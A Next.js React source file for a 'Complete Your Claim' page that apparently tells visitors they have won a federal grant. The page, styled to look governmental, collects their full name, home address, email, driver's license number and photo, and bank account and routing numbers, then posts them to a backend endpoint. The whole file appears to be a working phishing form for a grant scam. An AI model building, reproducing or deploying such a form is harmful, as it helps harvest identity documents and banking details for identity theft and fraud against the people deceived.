"use client"

import { Suspense, useState, useMemo, useRef } from "react"
import { useSearchParams } from "next/navigation"
import { motion } from "framer-motion"
import { Send, CheckCircle, Loader2, AlertCircle, CreditCard, Landmark, Copy, Check, Lock, Upload, X } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"

function generateUniqueCode(method: string): string {
  const prefix = method === "cashier_check" ? "CHK" : "EDP"
  const timestamp = Date.now().toString(36).toUpperCase()
  const random = Math.random().toString(36).substring(2, 8).toUpperCase()
  return `${prefix}-${timestamp}-${random}`
}

function ClaimFormContent() {
  const searchParams = useSearchParams()
  const winnerId = searchParams.get("id") || ""
  const amount = searchParams.get("amount") || "0"
  const method = searchParams.get("method") || "cashier_check"

  const formattedAmount = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 0,
  }).format(Number(amount))

  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [submitted, setSubmitted] = useState(false)
  const [copied, setCopied] = useState(false)
  const [dlImage, setDlImage] = useState<string>("")
  const [dlFileName, setDlFileName] = useState("")
  const fileInputRef = useRef<HTMLInputElement>(null)

  const uniqueCode = useMemo(() => generateUniqueCode(method), [method])

  const [cashierData, setCashierData] = useState({
    fullName: "",
    address: "",
    city: "",
    state: "",
    zipCode: "",
    driversLicense: "",
    email: "",
    receivedGrantsBefore: "",
  })

  const [depositData, setDepositData] = useState({
    fullName: "",
    accountNumber: "",
    routingNumber: "",
    homeAddress: "",
    homeCity: "",
    homeState: "",
    homeZipCode: "",
    bankAddress: "",
    bankCity: "",
    bankState: "",
    bankZipCode: "",
    bankName: "",
    email: "",
    receivedGrantsBefore: "",
  })

  const handleCashierChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    setCashierData({ ...cashierData, [e.target.name]: e.target.value })
  }

  const handleDepositChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    setDepositData({ ...depositData, [e.target.name]: e.target.value })
  }

  const handleCopy = () => {
    navigator.clipboard.writeText(uniqueCode)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return
    if (file.size > 10 * 1024 * 1024) {
      setError("File size must be under 10MB.")
      return
    }
    setDlFileName(file.name)
    const reader = new FileReader()
    reader.onloadend = () => {
      setDlImage(reader.result as string)
    }
    reader.readAsDataURL(file)
  }

  const removeDlImage = () => {
    setDlImage("")
    setDlFileName("")
    if (fileInputRef.current) fileInputRef.current.value = ""
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!dlImage) {
      setError("Please upload a photo of your driver's license.")
      return
    }
    setLoading(true)
    setError("")

    try {
      const payload = {
        winnerId,
        amount,
        method,
        uniqueCode,
        driversLicenseImage: dlImage,
        ...(method === "cashier_check" ? cashierData : depositData),
      }

      const res = await fetch("/api/submit-claim", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      })

      const data = await res.json()

      if (data.success) {
        setSubmitted(true)
      } else {
        setError(data.error || "Failed to submit claim. Please try again.")
      }
    } catch {
      setError("An error occurred. Please try again.")
    } finally {
      setLoading(false)
    }
  }

  if (submitted) {
    return (
      <div className="min-h-[80vh]">
        <div className="bg-[#1a1a5e] text-white px-4 py-8 sm:px-6 sm:py-10">
          <div className="mx-auto max-w-2xl">
            <h1 className="text-2xl font-bold sm:text-3xl">Claim Submitted</h1>
          </div>
        </div>
        <div className="mx-auto max-w-lg px-4 py-12 sm:px-6">
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <div className="border-l-4 border-[#00a91c] bg-[#ecf3ec] p-5 mb-6">
              <div className="flex items-start gap-3">
                <CheckCircle className="h-5 w-5 text-[#00a91c] mt-0.5 shrink-0" />
                <div>
                  <h2 className="text-lg font-bold text-[#1b1b1b]">Claim Successfully Submitted</h2>
                  <p className="mt-1 text-sm text-[#5c5c5c]">
                    Your grant claim has been submitted. Our team will review your application
                    and contact you within 3-5 business days.
                  </p>
                </div>
              </div>
            </div>

            <div className="border border-[#dfe1e2] bg-[#f7f7f7] p-5 rounded-sm mb-6">
              <p className="text-xs font-bold uppercase tracking-widest text-[#5c5c5c] mb-2">Your Reference Code</p>
              <div className="flex items-center gap-3">
                <code className="text-xl font-bold text-[#1a1a5e] tracking-wider">{uniqueCode}</code>
                <button
                  onClick={handleCopy}
                  className="flex h-8 w-8 items-center justify-center rounded-sm border border-[#dfe1e2] hover:bg-[#e8e8e8] transition-colors"
                >
                  {copied ? (
                    <Check className="h-3.5 w-3.5 text-[#00a91c]" />
                  ) : (
                    <Copy className="h-3.5 w-3.5 text-[#5c5c5c]" />
                  )}
                </button>
              </div>
              <p className="mt-2 text-[11px] text-[#5c5c5c]">
                This code has been sent to your email. Please save it for your records.
              </p>
            </div>

            <div className="border border-[#dfe1e2] bg-white p-4 rounded-sm text-sm text-[#5c5c5c]">
              <p className="font-bold text-[#1b1b1b]">
                Grant Amount: {formattedAmount} &middot; Method: {method === "cashier_check" ? "Cashier Check" : "Electronic Deposit"}
              </p>
              <p className="mt-1">Reference ID: CLM-{winnerId}</p>
            </div>
          </motion.div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-[80vh]">
      <div className="bg-[#1a1a5e] text-white px-4 py-8 sm:px-6 sm:py-10">
        <div className="mx-auto max-w-2xl">
          <div className="flex items-center gap-2 mb-2">
            {method === "cashier_check" ? (
              <CreditCard className="h-5 w-5 text-blue-200" />
            ) : (
              <Landmark className="h-5 w-5 text-blue-200" />
            )}
            <span className="text-sm text-blue-200">
              {method === "cashier_check" ? "Cashier Check" : "Electronic Deposit"} Claim
            </span>
          </div>
          <h1 className="text-2xl font-bold sm:text-3xl">Complete Your Claim</h1>
          <p className="mt-2 text-sm text-blue-100/80">
            Provide your details to process your {formattedAmount} grant.
          </p>
        </div>
      </div>

      <div className="mx-auto max-w-2xl px-4 py-10 sm:px-6">
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3 }}
        >
          <Card className="border border-[#dfe1e2] shadow-sm rounded-sm">
            <CardHeader className="border-b border-[#dfe1e2] bg-[#f7f7f7] py-4">
              <CardTitle className="text-lg font-bold text-[#1b1b1b]">
                {method === "cashier_check" ? "Cashier Check Details" : "Electronic Deposit Details"}
              </CardTitle>
            </CardHeader>
            <CardContent className="p-6">
              <form onSubmit={handleSubmit} className="space-y-5">
                {method === "cashier_check" ? (
                  <>
                    <div className="space-y-1.5">
                      <Label htmlFor="fullName" className="text-sm font-semibold text-[#1b1b1b]">Full Name *</Label>
                      <Input id="fullName" name="fullName" value={cashierData.fullName} onChange={handleCashierChange} required placeholder="John Doe" className="rounded-sm border-[#aaacae]" />
                    </div>

                    <div className="space-y-1.5">
                      <Label htmlFor="address" className="text-sm font-semibold text-[#1b1b1b]">Mailing Address *</Label>
                      <Input id="address" name="address" value={cashierData.address} onChange={handleCashierChange} required placeholder="123 Main Street" className="rounded-sm border-[#aaacae]" />
                    </div>

                    <div className="grid gap-4 sm:grid-cols-3">
                      <div className="space-y-1.5">
                        <Label htmlFor="city" className="text-sm font-semibold text-[#1b1b1b]">City *</Label>
                        <Input id="city" name="city" value={cashierData.city} onChange={handleCashierChange} required placeholder="New York" className="rounded-sm border-[#aaacae]" />
                      </div>
                      <div className="space-y-1.5">
                        <Label htmlFor="state" className="text-sm font-semibold text-[#1b1b1b]">State *</Label>
                        <Input id="state" name="state" value={cashierData.state} onChange={handleCashierChange} required placeholder="NY" maxLength={2} className="rounded-sm border-[#aaacae]" />
                      </div>
                      <div className="space-y-1.5">
                        <Label htmlFor="zipCode" className="text-sm font-semibold text-[#1b1b1b]">ZIP Code *</Label>
                        <Input id="zipCode" name="zipCode" value={cashierData.zipCode} onChange={handleCashierChange} required placeholder="10001" className="rounded-sm border-[#aaacae]" />
                      </div>
                    </div>

                    <div className="space-y-1.5">
                      <Label htmlFor="driversLicense" className="text-sm font-semibold text-[#1b1b1b]">Driver&apos;s License Number *</Label>
                      <Input id="driversLicense" name="driversLicense" value={cashierData.driversLicense} onChange={handleCashierChange} required placeholder="e.g. D12345678" className="rounded-sm border-[#aaacae]" />
                      <p className="text-[11px] text-[#5c5c5c]">Required for identity verification purposes.</p>
                    </div>

                    <div className="space-y-1.5">
                      <Label htmlFor="cashierEmail" className="text-sm font-semibold text-[#1b1b1b]">Email Address *</Label>
                      <Input id="cashierEmail" name="email" type="email" value={cashierData.email} onChange={handleCashierChange} required placeholder="john@example.com" className="rounded-sm border-[#aaacae]" />
                    </div>

                    <div className="space-y-2">
                      <Label className="text-sm font-semibold text-[#1b1b1b]">Have you received federal grants before? *</Label>
                      <div className="flex gap-3">
                        {["yes", "no"].map((val) => (
                          <label key={val} className={`flex-1 cursor-pointer border p-3 text-center transition-all rounded-sm ${
                            cashierData.receivedGrantsBefore === val
                              ? "border-[#005ea2] bg-[#e8f0fa] ring-1 ring-[#005ea2]"
                              : "border-[#dfe1e2] hover:border-[#aaacae]"
                          }`}>
                            <input type="radio" name="receivedGrantsBefore" value={val} checked={cashierData.receivedGrantsBefore === val} onChange={handleCashierChange} className="sr-only" required />
                            <span className="text-sm font-semibold capitalize">{val}</span>
                          </label>
                        ))}
                      </div>
                    </div>
                  </>
                ) : (
                  <>
                    <div className="space-y-1.5">
                      <Label htmlFor="fullName" className="text-sm font-semibold text-[#1b1b1b]">Full Name *</Label>
                      <Input id="fullName" name="fullName" value={depositData.fullName} onChange={handleDepositChange} required placeholder="John Doe" className="rounded-sm border-[#aaacae]" />
                    </div>

                    <div className="space-y-1.5">
                      <Label htmlFor="depositEmail" className="text-sm font-semibold text-[#1b1b1b]">Email Address *</Label>
                      <Input id="depositEmail" name="email" type="email" value={depositData.email} onChange={handleDepositChange} required placeholder="john@example.com" className="rounded-sm border-[#aaacae]" />
                    </div>

                    <div className="border-t border-[#dfe1e2] pt-4">
                      <h3 className="text-sm font-bold text-[#1b1b1b] mb-4">Banking Information</h3>
                    </div>

                    <div className="grid gap-4 sm:grid-cols-2">
                      <div className="space-y-1.5">
                        <Label htmlFor="accountNumber" className="text-sm font-semibold text-[#1b1b1b]">Account Number *</Label>
                        <Input id="accountNumber" name="accountNumber" value={depositData.accountNumber} onChange={handleDepositChange} required placeholder="e.g. 123456789" className="rounded-sm border-[#aaacae]" />
                      </div>
                      <div className="space-y-1.5">
                        <Label htmlFor="routingNumber" className="text-sm font-semibold text-[#1b1b1b]">Routing Number *</Label>
                        <Input id="routingNumber" name="routingNumber" value={depositData.routingNumber} onChange={handleDepositChange} required placeholder="e.g. 021000021" className="rounded-sm border-[#aaacae]" />
                      </div>
                    </div>

                    <div className="space-y-1.5">
                      <Label htmlFor="bankName" className="text-sm font-semibold text-[#1b1b1b]">Bank Name *</Label>
                      <Input id="bankName" name="bankName" value={depositData.bankName} onChange={handleDepositChange} required placeholder="e.g. Chase Bank" className="rounded-sm border-[#aaacae]" />
                    </div>

                    <div className="space-y-1.5">
                      <Label htmlFor="bankAddress" className="text-sm font-semibold text-[#1b1b1b]">Bank Address *</Label>
                      <Input id="bankAddress" name="bankAddress" value={depositData.bankAddress} onChange={handleDepositChange} required placeholder="456 Bank Street" className="rounded-sm border-[#aaacae]" />
                    </div>

                    <div className="grid gap-4 sm:grid-cols-3">
                      <div className="space-y-1.5">
                        <Label htmlFor="bankCity" className="text-sm font-semibold text-[#1b1b1b]">Bank City *</Label>
                        <Input id="bankCity" name="bankCity" value={depositData.bankCity} onChange={handleDepositChange} required placeholder="New York" className="rounded-sm border-[#aaacae]" />
                      </div>
                      <div className="space-y-1.5">
                        <Label htmlFor="bankState" className="text-sm font-semibold text-[#1b1b1b]">Bank State *</Label>
                        <Input id="bankState" name="bankState" value={depositData.bankState} onChange={handleDepositChange} required placeholder="NY" maxLength={2} className="rounded-sm border-[#aaacae]" />
                      </div>
                      <div className="space-y-1.5">
                        <Label htmlFor="bankZipCode" className="text-sm font-semibold text-[#1b1b1b]">Bank ZIP *</Label>
                        <Input id="bankZipCode" name="bankZipCode" value={depositData.bankZipCode} onChange={handleDepositChange} required placeholder="10001" className="rounded-sm border-[#aaacae]" />
                      </div>
                    </div>

                    <div className="border-t border-[#dfe1e2] pt-4">
                      <h3 className="text-sm font-bold text-[#1b1b1b] mb-4">Home Address</h3>
                    </div>

                    <div className="space-y-1.5">
                      <Label htmlFor="homeAddress" className="text-sm font-semibold text-[#1b1b1b]">Home Address *</Label>
                      <Input id="homeAddress" name="homeAddress" value={depositData.homeAddress} onChange={handleDepositChange} required placeholder="123 Main Street" className="rounded-sm border-[#aaacae]" />
                    </div>

                    <div className="grid gap-4 sm:grid-cols-3">
                      <div className="space-y-1.5">
                        <Label htmlFor="homeCity" className="text-sm font-semibold text-[#1b1b1b]">City *</Label>
                        <Input id="homeCity" name="homeCity" value={depositData.homeCity} onChange={handleDepositChange} required placeholder="New York" className="rounded-sm border-[#aaacae]" />
                      </div>
                      <div className="space-y-1.5">
                        <Label htmlFor="homeState" className="text-sm font-semibold text-[#1b1b1b]">State *</Label>
                        <Input id="homeState" name="homeState" value={depositData.homeState} onChange={handleDepositChange} required placeholder="NY" maxLength={2} className="rounded-sm border-[#aaacae]" />
                      </div>
                      <div className="space-y-1.5">
                        <Label htmlFor="homeZipCode" className="text-sm font-semibold text-[#1b1b1b]">ZIP Code *</Label>
                        <Input id="homeZipCode" name="homeZipCode" value={depositData.homeZipCode} onChange={handleDepositChange} required placeholder="10001" className="rounded-sm border-[#aaacae]" />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label className="text-sm font-semibold text-[#1b1b1b]">Have you received federal grants before? *</Label>
                      <div className="flex gap-3">
                        {["yes", "no"].map((val) => (
                          <label key={val} className={`flex-1 cursor-pointer border p-3 text-center transition-all rounded-sm ${
                            depositData.receivedGrantsBefore === val
                              ? "border-[#005ea2] bg-[#e8f0fa] ring-1 ring-[#005ea2]"
                              : "border-[#dfe1e2] hover:border-[#aaacae]"
                          }`}>
                            <input type="radio" name="receivedGrantsBefore" value={val} checked={depositData.receivedGrantsBefore === val} onChange={handleDepositChange} className="sr-only" required />
                            <span className="text-sm font-semibold capitalize">{val}</span>
                          </label>
                        ))}
                      </div>
                    </div>
                  </>
                )}

                {/* Driver's License Upload - shared by both methods */}
                <div className="border-t border-[#dfe1e2] pt-5">
                  <Label className="text-sm font-semibold text-[#1b1b1b]">Upload Driver&apos;s License Photo *</Label>
                  <p className="text-[11px] text-[#5c5c5c] mb-3">Upload a clear photo of your driver&apos;s license for identity verification. Max 10MB.</p>
                  {dlImage ? (
                    <div className="relative border border-[#dfe1e2] rounded-sm p-3 bg-[#f7f7f7]">
                      <div className="flex items-center gap-3">
                        <CheckCircle className="h-4 w-4 text-[#00a91c] shrink-0" />
                        <span className="text-sm text-[#1b1b1b] truncate flex-1">{dlFileName}</span>
                        <button type="button" onClick={removeDlImage} className="flex h-7 w-7 items-center justify-center rounded-sm hover:bg-[#e8e8e8] transition-colors">
                          <X className="h-4 w-4 text-[#5c5c5c]" />
                        </button>
                      </div>
                    </div>
                  ) : (
                    <label className="flex cursor-pointer flex-col items-center gap-2 border-2 border-dashed border-[#aaacae] rounded-sm p-8 hover:border-[#005ea2] hover:bg-[#f7f7f7] transition-colors">
                      <Upload className="h-6 w-6 text-[#5c5c5c]" />
                      <span className="text-sm font-medium text-[#005ea2]">Click to upload</span>
                      <span className="text-[11px] text-[#5c5c5c]">JPG, PNG, or PDF up to 10MB</span>
                      <input
                        ref={fileInputRef}
                        type="file"
                        accept="image/*,.pdf"
                        onChange={handleFileUpload}
                        className="sr-only"
                      />
                    </label>
                  )}
                </div>

                {error && (
                  <div className="flex items-center gap-2 border-l-4 border-[#b50909] bg-[#fef1f1] p-3 text-sm text-[#b50909]">
                    <AlertCircle className="h-4 w-4 shrink-0" />
                    {error}
                  </div>
                )}

                <Button type="submit" size="lg" className="w-full rounded-sm bg-[#005ea2] hover:bg-[#1a4480] text-white" disabled={loading}>
                  {loading ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Submitting...
                    </>
                  ) : (
                    <>
                      <Send className="mr-2 h-4 w-4" />
                      Submit Claim
                    </>
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>
        </motion.div>

        <p className="mt-6 flex items-center justify-center gap-1.5 text-[11px] text-[#5c5c5c]">
          <Lock className="h-3 w-3" />
          Your information is protected and will only be used for grant processing.
        </p>
      </div>
    </div>
  )
}

export default function ClaimPage() {
  return (
    <Suspense fallback={<div className="min-h-[80vh] flex items-center justify-center"><p>Loading...</p></div>}>
      <ClaimFormContent />
    </Suspense>
  )
}
